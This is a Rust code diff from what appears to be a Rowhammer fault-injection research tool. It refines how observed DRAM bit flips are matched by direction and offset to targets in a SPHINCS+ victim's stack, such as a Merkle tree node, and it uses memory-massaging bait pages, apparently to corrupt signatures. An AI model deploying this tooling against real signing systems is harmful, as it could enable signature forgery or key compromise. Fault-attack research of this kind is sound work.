@@ -11,7 +11,7 @@ use std::{
 };
 
 use crate::{
-    memory::{find_flippy_page, PfnResolver},
+    memory::{find_flippy_page, BitFlip, FlipDirection, PfnResolver, PhysAddr},
     util::PAGE_SIZE,
 };
 
@@ -31,7 +31,7 @@ enum State {
         stdout_thread: Option<thread::JoinHandle<(Vec<String>, ChildStdout)>>,
         #[serde(skip_serializing)]
         stderr_logger: Option<thread::JoinHandle<()>>,
-        target_pfn: u64,
+        target_pfn: PhysAddr,
         injection_config: InjectionConfig,
     },
     Stopped,
@@ -100,15 +100,25 @@ pub struct TargetOffset {
     pub page_offset: usize,
     stack_offset: usize,
     pub target_size: usize,
+    pub flip_direction: FlipDirection,
 }
-fn filter_addrs(addrs: Vec<usize>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
-    addrs
+
+fn filter_addrs(flips: Vec<BitFlip>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
+    flips
         .into_iter()
-        .filter_map(|addr| {
+        .filter_map(|flip| {
+            let flipped_bits = flip.data & flip.bitmask;
+            let addr = flip.addr;
             let pg_offset = addr & 0xfff;
             let matched = targets.iter().find(|&target| {
+                let direction_match = match target.flip_direction {
+                    FlipDirection::ZeroToOne => flipped_bits == 0,
+                    FlipDirection::OneToZero => flipped_bits == flip.bitmask,
+                    FlipDirection::Any => true,
+                    FlipDirection::None | FlipDirection::Multiple(_) => unimplemented!(),
+                };
                 let addr = target.page_offset & 0xfff;
-                addr <= pg_offset && pg_offset < addr + target.target_size
+                direction_match && addr <= pg_offset && pg_offset < addr + target.target_size
             });
             if matched.is_some() {
                 info!("Matched addr {:?} to target {:?}", addr, matched);
@@ -123,15 +133,17 @@ const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
     page_offset: 0,
     stack_offset: 31,
     target_size: 0x1000,
+    flip_direction: FlipDirection::Any,
 }];
 
 // Target offsets for shake-256s WITH memutils printing enabled
 pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
     TargetOffset {
-        description: "stack merkle",
+        description: "stack merkle tree layer 0",
         page_offset: 0x930,
         stack_offset: 31,
-        target_size: 256,
+        target_size: 32, // SPX_N
+        flip_direction: FlipDirection::OneToZero,
     },
     /*TargetOffset {
         description: "leaf_addr",
@@ -147,11 +159,11 @@ pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
     },*/
 ];
 
-fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
+fn find_injectable_page(flips: Vec<BitFlip>) -> Option<InjectionConfig> {
     // the number of bait pages to release after the target page (for memory massaging)
     let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
 
-    filter_addrs(addrs, &TARGET_OFFSETS_SHAKE_256S)
+    filter_addrs(flips, &TARGET_OFFSETS_SHAKE_256S)
         .first()
         .map(|f| InjectionConfig {
             target_addr: f.0,
@@ -173,8 +185,8 @@ impl SphincsPlus {
     /// - `keys_path`: The path to the keys.
     /// - `sigs_path`: The output path to the signatures.
     /// - `injection_config`: The injection configuration.
-    pub fn new(binary: String, addrs: Vec<usize>) -> anyhow::Result<Self> {
-        let injection_config = find_injectable_page(addrs)
+    pub fn new(binary: String, flips: Vec<BitFlip>) -> anyhow::Result<Self> {
+        let injection_config = find_injectable_page(flips)
             .ok_or_else(|| anyhow::anyhow!("No page suitable for injection found"))?;
         Ok(Self {
             state: State::Init {
@@ -437,6 +449,7 @@ mod tests {
 
     use crate::{
         allocator::util::mmap,
+        memory::BitFlip,
         util::PAGE_SIZE,
         victim::{
             sphincs_plus::{self, filter_addrs, TargetOffset},
@@ -446,10 +459,11 @@ mod tests {
 
     #[test]
     fn test_sphincs_plus() -> anyhow::Result<()> {
-        let ptr = mmap(null_mut(), PAGE_SIZE) as *const libc::c_void;
+        let ptr = mmap(null_mut(), PAGE_SIZE);
+        let flip = BitFlip::new(ptr, 0x1, 0x1);
         let mut stack_process = super::SphincsPlus::new(
             "/home/jb/sphincsplus/ref/test/server".to_string(),
-            vec![ptr as usize],
+            vec![flip],
         )?;
         for _ in 0..10 {
             stack_process.init();
@@ -465,40 +479,43 @@ mod tests {
 
     #[test]
     fn test_filter_addrs_match_start() {
-        let addrs = vec![0x700];
+        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
         let targets = [TargetOffset {
             description: "test_filter_flips_match_start",
             page_offset: 0x700,
             stack_offset: 31,
             target_size: 32,
+            flip_direction: sphincs_plus::FlipDirection::Any,
         }];
-        let filtered = filter_addrs(addrs, &targets);
+        let filtered = filter_addrs(vec![flip], &targets);
         assert_eq!(filtered.len(), 1);
     }
 
     #[test]
     fn test_filter_addrs_match_end() {
-        let addrs = vec![0x700];
+        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
         let target = TargetOffset {
             description: "test_filter_flips_match_end",
             page_offset: 0x600,
             stack_offset: 31,
             target_size: 0x101,
+            flip_direction: sphincs_plus::FlipDirection::Any,
         };
-        let filtered = filter_addrs(addrs, &[target]);
+        let filtered = filter_addrs(vec![flip], &[target]);
         assert_eq!(filtered.len(), 1);
     }
 
     #[test]
     fn test_filter_addrs_nomatch() {
-        let addrs = vec![0x700];
+        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
         let target = TargetOffset {
             description: "test_filter_flips_nomatch",
             page_offset: 0x600,
             stack_offset: 31,
             target_size: 0x100,
+            flip_direction: sphincs_plus::FlipDirection::Any,
         };
-        let filtered = filter_addrs(addrs, &[target]);
+        let filtered = filter_addrs(vec![flip], &[target]);
         assert_eq!(filtered.len(), 0);
     }
 }
